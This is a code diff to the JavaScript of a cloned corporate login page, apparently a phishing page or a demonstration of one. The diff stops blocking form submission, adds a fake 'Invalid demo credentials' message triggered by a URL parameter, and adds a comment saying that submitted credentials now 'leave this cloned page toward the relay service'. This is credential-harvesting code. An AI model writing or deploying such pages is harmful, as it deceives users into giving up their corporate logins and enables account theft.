@@ -8,6 +8,10 @@ const toggle = document.getElementById('toggle-password');
 const dialog = document.getElementById('demo-dialog');
 
 
+if (new URLSearchParams(location.search).get('error')) {
+  error.textContent = 'Invalid demo credentials';
+}
+
 toggle.addEventListener('click', () => {
   const visible = password.type === 'text';
   password.type = visible ? 'password' : 'text';
@@ -17,13 +21,14 @@ toggle.addEventListener('click', () => {
 });
 
 form.addEventListener('submit', (event) => {
-  event.preventDefault();
-  error.textContent = '';
   const email = username.value.trim().toLowerCase();
   const pw = password.value;
   if (!email || !pw) {
+    event.preventDefault();
     error.textContent = 'Please enter your corporate email and password!';
+    return;
   }
+  // This is the moment the credentials leave this cloned page toward the relay service.
 });
 
 function closeDialog() { dialog.close(); }
